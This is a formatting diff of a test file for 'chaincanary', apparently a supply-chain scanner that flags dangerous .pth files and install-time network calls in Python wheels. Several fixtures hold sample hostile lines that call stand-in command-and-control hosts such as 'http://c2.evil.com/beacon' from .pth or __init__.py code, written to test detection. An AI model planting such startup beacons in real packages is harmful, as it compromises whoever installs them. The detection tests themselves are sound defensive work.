@@ -2,13 +2,13 @@
 Tests for .pth semantic analysis and edge cases.
 Verifies that legitimate packages don't generate false positives.
 """
-import pytest
-import zipfile
+
 import tempfile
+import zipfile
 from pathlib import Path
 
+from chaincanary.analyzer.pth_analyzer import PthClass, analyze_pth_content
 from chaincanary.analyzer.static import StaticAnalyzer
-from chaincanary.analyzer.pth_analyzer import analyze_pth_content, PthClass
 from chaincanary.models import Severity
 
 
@@ -63,15 +63,11 @@ class TestPthAnalyzer:
         assert len(a.risk_signals) >= 1
 
     def test_urllib_in_pth_is_dangerous(self):
-        a = analyze_pth_content(
-            "import urllib.request; urllib.request.urlopen('http://evil.com')"
-        )
+        a = analyze_pth_content("import urllib.request; urllib.request.urlopen('http://evil.com')")
         assert a.pth_class == PthClass.DANGEROUS
 
     def test_requests_in_pth_is_dangerous(self):
-        a = analyze_pth_content(
-            "import requests; requests.get('http://c2.evil.com/beacon')"
-        )
+        a = analyze_pth_content("import requests; requests.get('http://c2.evil.com/beacon')")
         assert a.pth_class == PthClass.DANGEROUS
 
 
@@ -86,24 +82,32 @@ class TestFalsePositives:
 
     def test_empty_pth_no_critical(self):
         """Empty .pth file (like pytest-cov) must not be CRITICAL."""
-        whl = make_wheel("pytest-cov", "4.0.0", {
-            "pytest_cov/__init__.py": "# ok",
-            "pytest-cov.pth": "",
-        })
+        whl = make_wheel(
+            "pytest-cov",
+            "4.0.0",
+            {
+                "pytest_cov/__init__.py": "# ok",
+                "pytest-cov.pth": "",
+            },
+        )
         findings = self.static.analyze_wheel(whl)
         critical = [f for f in findings if f.severity == Severity.CRITICAL]
         assert critical == [], f"False positive: {[f.rule_id for f in critical]}"
 
     def test_setuptools_shim_not_critical(self):
         """setuptools distutils-precedence.pth must not be CRITICAL."""
-        whl = make_wheel("setuptools", "69.0.0", {
-            "setuptools/__init__.py": "# ok",
-            "distutils-precedence.pth": (
-                "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; "
-                "enabled = os.environ.get(var, 'local') == 'local'; "
-                "enabled and __import__('_distutils_hack').add_shim()"
-            ),
-        })
+        whl = make_wheel(
+            "setuptools",
+            "69.0.0",
+            {
+                "setuptools/__init__.py": "# ok",
+                "distutils-precedence.pth": (
+                    "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; "
+                    "enabled = os.environ.get(var, 'local') == 'local'; "
+                    "enabled and __import__('_distutils_hack').add_shim()"
+                ),
+            },
+        )
         findings = self.static.analyze_wheel(whl, "setuptools")
         critical = [f for f in findings if f.severity == Severity.CRITICAL]
         assert critical == [], f"False positive on setuptools: {[f.rule_id for f in critical]}"
@@ -113,35 +117,46 @@ class TestFalsePositives:
 
     def test_pure_path_pth_no_finding(self):
         """Pure filesystem path .pth must produce zero findings."""
-        whl = make_wheel("mylib", "1.0.0", {
-            "mylib/__init__.py": "# ok",
-            "mylib.pth": "/usr/local/lib/python3.11/site-packages\n",
-        })
+        whl = make_wheel(
+            "mylib",
+            "1.0.0",
+            {
+                "mylib/__init__.py": "# ok",
+                "mylib.pth": "/usr/local/lib/python3.11/site-packages\n",
+            },
+        )
         findings = self.static.analyze_wheel(whl)
         assert findings == [], f"Unexpected finding: {[f.rule_id for f in findings]}"
 
     def test_normal_package_no_findings(self):
         """Clean package with no hooks and no network code = zero findings."""
-        whl = make_wheel("mylib", "1.0.0", {
-            "mylib/__init__.py": "def hello(): return 'world'",
-            "mylib/utils.py": "import os\ndef get_path(): return os.getcwd()",
-            "mylib/client.py": (
-                "import requests\n"
-                "class Client:\n"
-                "    def fetch(self, url): return requests.get(url)\n"
-            ),
-        })
+        whl = make_wheel(
+            "mylib",
+            "1.0.0",
+            {
+                "mylib/__init__.py": "def hello(): return 'world'",
+                "mylib/utils.py": "import os\ndef get_path(): return os.getcwd()",
+                "mylib/client.py": (
+                    "import requests\n"
+                    "class Client:\n"
+                    "    def fetch(self, url): return requests.get(url)\n"
+                ),
+            },
+        )
         findings = self.static.analyze_wheel(whl)
-        critical_or_high = [f for f in findings
-                            if f.severity in (Severity.CRITICAL, Severity.HIGH)]
+        critical_or_high = [f for f in findings if f.severity in (Severity.CRITICAL, Severity.HIGH)]
         assert critical_or_high == []
 
     def test_coverage_pth_not_critical(self):
         """coverage.py style .pth (runs its own startup hook) must not be CRITICAL."""
-        whl = make_wheel("coverage", "7.4.0", {
-            "coverage/__init__.py": "# coverage",
-            "coverage.pth": "import coverage; coverage.process_startup()",
-        })
+        whl = make_wheel(
+            "coverage",
+            "7.4.0",
+            {
+                "coverage/__init__.py": "# coverage",
+                "coverage.pth": "import coverage; coverage.process_startup()",
+            },
+        )
         findings = self.static.analyze_wheel(whl, "coverage")
         critical = [f for f in findings if f.severity == Severity.CRITICAL]
         assert critical == [], f"False positive on coverage: {[f.rule_id for f in critical]}"
@@ -155,20 +170,27 @@ class TestDelayedTriggerDetection:
 
     def test_network_in_init_detected(self):
         """Network call in __init__.py should be flagged as MEDIUM."""
-        whl = make_wheel("sneaky", "1.0.0", {
-            "sneaky/__init__.py": (
-                "import urllib.request\n"
-                "urllib.request.urlopen('http://c2.evil.com')\n"
-            ),
-        })
+        whl = make_wheel(
+            "sneaky",
+            "1.0.0",
+            {
+                "sneaky/__init__.py": (
+                    "import urllib.request\nurllib.request.urlopen('http://c2.evil.com')\n"
+                ),
+            },
+        )
         findings = self.static.analyze_wheel(whl)
         rule_ids = [f.rule_id for f in findings]
         assert "INIT_NETWORK_CALL" in rule_ids
 
     def test_init_network_severity_is_medium(self):
-        whl = make_wheel("sneaky", "1.0.0", {
-            "sneaky/__init__.py": "import requests; requests.get('http://evil.com')",
-        })
+        whl = make_wheel(
+            "sneaky",
+            "1.0.0",
+            {
+                "sneaky/__init__.py": "import requests; requests.get('http://evil.com')",
+            },
+        )
         findings = self.static.analyze_wheel(whl)
         init_finding = next((f for f in findings if f.rule_id == "INIT_NETWORK_CALL"), None)
         assert init_finding is not None
@@ -211,6 +233,7 @@ class TestLockfileParser:
 
     def test_parse_pinned_requirements(self):
         from chaincanary.lockfile import parse_requirements_txt
+
         content = "litellm==1.82.7\nrequests==2.28.0\nnumpy>=1.24\n"
         tmpdir = Path(tempfile.mkdtemp())
         req_file = tmpdir / "requirements.txt"
@@ -225,11 +248,9 @@ class TestLockfileParser:
 
     def test_skip_comments_and_flags(self):
         from chaincanary.lockfile import parse_requirements_txt
+
         content = (
-            "# This is a comment\n"
-            "-r other.txt\n"
-            "--index-url https://pypi.org/simple\n"
-            "flask==2.3.0\n"
+            "# This is a comment\n-r other.txt\n--index-url https://pypi.org/simple\nflask==2.3.0\n"
         )
         tmpdir = Path(tempfile.mkdtemp())
         req_file = tmpdir / "requirements.txt"
